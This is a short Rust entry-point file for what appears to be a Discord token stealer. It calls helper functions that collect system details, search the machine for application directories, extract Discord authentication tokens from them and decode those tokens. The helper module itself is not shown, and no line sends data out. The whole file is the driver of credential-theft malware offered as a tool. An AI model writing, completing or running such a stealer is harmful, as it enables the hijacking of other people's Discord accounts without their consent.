use methods::{
    decode_discord_token, discord_token_hunter, get_system_details, hunt_for_directories,
};

mod methods;

fn main() {
    let system_details = get_system_details();
    let directories = hunt_for_directories(system_details);

    // println!("{:?}", directories);

    for directory in directories {
        match discord_token_hunter(&directory) {
            Ok(token) => {
                if directory.contains("discord") {
                    decode_discord_token(&token, &directory);
                }
            }
            Err(e) => println!("Error: {}", e),
        }
    }
}
